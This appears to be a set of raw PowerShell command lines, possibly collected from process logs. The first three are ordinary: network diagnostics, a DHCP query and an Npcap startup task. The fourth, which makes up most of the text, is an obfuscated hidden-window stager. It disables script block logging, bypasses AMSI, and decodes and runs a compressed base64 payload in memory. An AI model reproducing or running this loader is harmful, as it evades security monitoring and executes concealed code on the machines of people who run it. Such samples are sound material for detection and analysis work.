```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -command $net_adapter=(Get-NetAdapter -IncludeHidden); 
$output= ($net_adapter); 
$output += ($net_adapter | fl *); 
$output += (Get-NetAdapterAdvancedProperty | fl); 
$net_adapter_bindings=(Get-NetAdapterBinding -IncludeHidden); 
$output += ($net_adapter_bindings); 
$output += ($net_adapter_bindings | fl); 
$output += (Get-NetIpConfiguration -Detailed); 
$output += (Get-DnsClientNrptPolicy); 
$output += (Resolve-DnsName bing.com); 
$output += (ping bing.com -4); 
$output += (ping bing.com -6); 
$output += (Test-NetConnection bing.com -InformationLevel Detailed); 
$output += (Test-NetConnection bing.com -InformationLevel Detailed -CommonTCPPort HTTP); 
$output += (Get-NetRoute); $output += (Get-NetIPaddress); $output += (Get-NetLbfoTeam); 
$output += (Get-Service -Name:VMMS); 
$output += (Get-VMSwitch); 
$output += (Get-VMNetworkAdapter -all); 
$output += (Get-DnsClientNrptPolicy); 
$output += (Get-WindowsOptionalFeature -Online); 
$output += (Get-Service | fl); 
$pnp_devices = (Get-PnpDevice); 
$output += ($pnp_devices); 
$output += ($pnp_devices | Get-PnpDeviceProperty -KeyName DEVPKEY_Device_InstanceId,DEVPKEY_Device_DevNodeStatus,DEVPKEY_Device_ProblemCode); 
$output | Out-File config\PowershellInfo.log
```
```
powershell -command 'Get-DhcpServerInDC'
```
```
powershell.exe -NoProfile -WindowStyle Hidden -NonInteractive -Command Register-ScheduledTask -Force -TaskName 'npcapwatchdog' -Description 'Ensure Npcap service is configured to start at boot' -Action (New-ScheduledTaskAction -Execute 'C:\Program Files\Npcap\CheckStatus.bat') -Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount) -Trigger (New-ScheduledTaskTrigger -AtStartup)
```
```
C:\WINDOWS\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $tjtrJ=((''+'Enabl{3}Sc{'+'2}ipt{1}lo'+'c{4}{0'+'}nv'+'ocation{5}ogg'+'i'+'ng')-f'I','B','r','e','k','L'); $gwcY=(('{'+'3}nabl{2}Sc{'+'1}i'+'pt{0}lockL'+'ogging'+'')-f'B','r','e','E'); $jZ5C=(('Sc'+'ript{2}{1}oc{0}L'+'og'+'ging'+'')-f'k','l','B'); $xLV9W=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $znaT=[Ref].Assembly.GetType((('{0}'+'{'+'6'+'}'+'stem{9}'+'{4'+'}ana'+'{3'+'}ement{9}{'+'7}'+'{2'+'}'+'t{'+'8}'+'mati{8}n{'+'9}{7}ms'+'i'+'{'+'1}t'+'i{5'+'}s')-f'S','U','u','g','M','l','y','A','o','.')); $uYi_U=[Ref].Assembly.GetType(((''+'{3}'+'ystem.{'+'2}a'+'na{0}ement.'+'{'+'1}utomation.{4}'+'ti{5}s')-f'g','A','M','S','U','l')); if ($znaT) { $znaT.GetField((('am{'+'3'+'}i{0'+'}{2}i{'+'1}'+'Fa'+'i'+'{4'+'}ed')-f'I','t','n','s','l'),'NonPublic,Static').SetValue($null,$true); }; $ff4Nc=$uYi_U.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($ff4Nc) { $lUh3W=$ff4Nc.GetValue($null); If($lUh3W[$jZ5C]){ $lUh3W[$jZ5C][$gwcY]=0; $lUh3W[$jZ5C][$tjtrJ]=0; } $xLV9W.Add($gwcY,0); $xLV9W.Add($tjtrJ,0); $lUh3W['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$jZ5C]=$xLV9W; } Else { [Ref].Assembly.GetType((('Sy{'+'0}tem.Management'+'.A{'+'4}'+'tomatio'+'n.S'+'c{1}ipt'+'{2}{5}oc{3'+'}')-f's','r','B','k','u','l')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIAH8phmICA7VX+'+'2/iS'+'BL+faX9H6wVEkYhYAPJhZFGOhtsMMG8/MKwaNXYDTS0bW'+'I3ELK7//tV80gyN8nd3EljCcXu{2}'+'qqu/uq{2}Rxa7OGAki{1}VWDY{1}/f/1FuDwDlKJIEHPR4zosCjkajNe48LYNCx'+'vhqyBOle22mUSIxLMvXxq7NMUxO3+XWpgpWYajOSU4EwvCX4K3wim+7c/XOGDCn0Luj1KLJnNEL2LHBgpWWLhV4pDvdZMAcc9K1pYSJuZ//z1fmN7Ks5L2t'+'EM0E/PWMWM4KoWU5gvC3wV+oH3cYjFvkiBNsmTBSh6Jq5WSE2dogXtgbY9NzFZJmOXhLm+3STHbpfHpUtzKWUbMw+sgT{1}IlDFOcZfmiMOX2p7PZP8Xp5fDRLmYkwiUjZjhNthZO9yTAWamN4pDiEV7M{1}MtiK'+'YmXs0IBxPbJBou5eEdpUfhfzIg9fLhC96NK4nslkBqwtFCEmH5/TTMJdxSfFfMf+Hmi{1}{1}GeVyoAfn9zCBdX/hx{2}Dx/w523h+kxPOxhcFgdJRk66XwWpKJhwOmJJeoTPnJ3ucGH2C{2}i{1}e+paD8UftSZfVbmiBwtTNyHh7E39m+jnNu3I0bnU52Ru4gWJcfMYo4gEV76KHwUFLyg+IVK6ivXA{1}TF/2cBhE1O8RIzjzLnxnZoWEfaqq+4IDXGqBBDYDLyCmBe+deYcOjFvxCaOAL3zN5A1t4AswVfpS2Yc{2}6fzbxDKNyjKsq'+'Iw2'+'EGaBkXBwo'+'hiSHglzshl'+'S9mx5PSaf3PX3FFGApSxq7lZ4d/xvJzbSOKMpbsAAgsY2NYWBwRRDklRaJM{1}q0eLLK/n5z8EpIEohfwBS3sICKxwI'+'CzG6ZLy'+'2sSpUShZmBnRluIIZE51{1}6doCVXikiUnfqElDvOfeXpNhzP3OTZXUN75C{1}G3aMKKgktSBmWI4/zk/V9OfF9+zt40UnyJj3hNsql6ZDwNcoc/As7TC0YnRFIGaOhpEqkow/e1c60Rfyv3yUCBx2+2{2}YnBLBN+TSOmRDYcUjUSc/EwYFISmUEjG7T0B4UclofgoacEYSfEdcutMUszWGOgtIdEUmu{2}{1}JVseHcMZ{2}{1}M5htK214FVBo022XLzyRyaHvc1tlGUKu1x5JS{2}db6VWkD6PlEXm6UsBeRw3MX3qGo9{2}uqkamS{1}bVOYzT3'+'Kv{2}Eo+1yTV8tvCSz7v1muVyuh6h1R0NFTcIK3SF3lNjtIFLLZdcMme3IPdu5ISq/p+3V75H3nPnWg9xdK8vHFh363vAfhtYbupY6cI7Kc899eBm/aMt5i6YTS+35n{2}m0ZXPpNTbL4Vg9zFvueOJ1umg83PfWCtjRdqbtLB81Z{2}iab'+'HYbaoY8Rg0tpH6F7R8t1ZuMOy/Iq++6Lx{2}IG0vwg4AflH+PbE3qN1Tb9ya{2}INpwmxLYVFBz62G0KMtuz0ZLuENlFWhDRblvmvwu+1579D{1}nMnK1iWl5juw2w8R+M'+'Wp'+'zV++F1dVkSOnBch5qvbW+Np1R14xHVcudDLDuRqEUbnxvFA83YXUU1dlkPdLnY/Mw15gauuEBNzcVX5{2}0{2}aZTHWnUMt3tnbPZtvs6bVhxZ41sN5vTVTNw6m'+'vf0425I79MKqNFKD0bOA4Zcphstfxnx6HSpO3e2c7dMJTqkblxj67baZgVeTe3fcmu9Iy52xmNWndqb6wd7a{2}aVH{1'+'}1cWvR4nlfdkkwsZGiHO+NEY/j2JEnyb3s7Po{1}Wxolj+MKUcyDohCsPqm6+tSG/dBBeAW6p7jDd3fo+xjkgZuy3iKGBvJIsw893CzLTl1+wasO5wbaqInCkW0tFUVTFMDb3+oDWq57YKffuZPDRGnAvt7zkP{2}oEdwty/5YCc2b{2}npoN7n9O3fdHN+sUiBl2b{1}V4IV/gHiffkp'+'3v2xbySN6RO5+Ui3L9qG1UJ6UmxtVVues{2}VU7e7RU7XLd+fob5PTUITG{2}Vma59O7Z4c3v119yq9G9+S61P+vtJkqzFaK{1}8tC1{2}8'+'VXT1L90oY'+'HCeEaosjHu{1}1OY0xhAIIR6VqwFEqTgE8BvF/DAHIeC/iU4hgnpz56Kwivgo'+'W36eC69OXLBHyEGgjVqdTF8ZKtitJzVZKgqUvPUu1U6378Yo1kexS5'+'{2}SKfCk7AXGzTk20wRxaCKP50qGD2Y9CCPgX{2}M9zg5A30C+hg5yLO0VOThL7H7nKtVya8gw4wk+HiUz71nRgCBm7xk5BjfCZ6P2PlsPZTKXPpRCv4E/4Xy{2}yt/YfdH6KRVDxj893yt'+'wvvuvjPA8BDhIGgBR2V4vOc9yEOlyx5F16s{1}{1}osLg//36e/Y7c9mKZPHf1f580shnUNAAA{0}')-f'=','Q','r')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
```

































